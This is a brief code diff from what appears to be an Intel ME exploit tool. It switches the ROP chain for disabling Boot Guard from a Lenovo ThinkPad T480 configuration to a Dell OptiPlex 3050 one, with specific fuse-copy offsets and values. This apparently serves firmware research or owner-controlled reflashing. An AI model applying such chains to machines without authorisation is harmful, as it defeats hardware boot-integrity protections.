@@ -132,13 +132,13 @@ def GenerateRops(me_info):
     rops = b""
 
     ### START - bootguard disable rops for Dell OptiPlex 3050
-    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
-    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x02fe3d71)
+    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
+    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x02fe3d71)
     ### END - bootguard disable rops
 
     ### START - bootguard disable rops for Lenovo ThinkPad T480
-    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
-    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x021A39B0)
+    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
+    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x021A39B0)
     ### END - bootguard disable rops
 
     ### START - red unlock
